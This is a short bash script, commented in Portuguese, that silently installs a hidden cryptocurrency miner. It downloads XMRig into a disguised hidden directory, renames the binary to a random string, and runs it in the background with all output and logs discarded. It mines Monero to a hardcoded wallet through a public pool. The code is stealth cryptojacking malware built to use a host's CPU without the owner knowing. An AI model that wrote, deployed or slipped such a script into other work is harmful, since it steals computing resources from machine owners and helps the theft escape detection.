#!/bin/bash

# === CONFIGURAÇÃO ===
WALLET="46sF91sVBzUVMgoV2nd5DQTSKM1LgvArTQNw5kufrVNYVV4CDrMiKno4c5kTpoqnH9eVu3dGqTuyEWH5muz32f9XESZHUrm"
POOL="xmr-eu1.nanopool.org:14433"
WORKER=$(hostname)-$(date +%s)
RAND_BIN=$(tr -dc a-z0-9 </dev/urandom | head -c 8)

# Silenciar tudo
exec >/dev/null 2>&1

# Atualizar pacotes e instalar dependências
apt update -y && apt install -y wget tar

# Criar diretório oculto
mkdir -p ~/.sysupd/.core
cd ~/.sysupd/.core

# Baixar e extrair XMRig
wget -q https://github.com/xmrig/xmrig/releases/latest/download/xmrig-*-linux-x64.tar.gz -O core.tar.gz
tar -xf core.tar.gz
cd xmrig-*-linux-x64

# Renomear binário e dar permissão
mv xmrig $RAND_BIN
chmod +x $RAND_BIN

# Executar minerador em background com stealth
nohup ./$RAND_BIN -o $POOL -u $WALLET -k --tls \
  --donate-level=0 --cpu-priority=5 \
  --log-file=/dev/null --user-agent="$WORKER" \
  > /dev/null 2>&1 &
